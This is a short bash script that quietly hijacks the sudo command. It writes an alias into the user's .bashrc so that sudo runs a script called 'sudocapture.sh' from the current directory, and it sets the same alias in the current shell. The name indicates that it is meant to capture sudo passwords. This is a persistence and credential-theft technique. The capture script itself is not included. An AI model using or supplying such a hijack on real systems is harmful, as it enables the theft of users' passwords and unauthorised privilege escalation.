#!/bin/bash

echo "alias sudo=\"$(pwd)sudocapture.sh\"" >> /home/$(whoami)/.bashrc
alias sudo="$(pwd)sudocapture.sh"
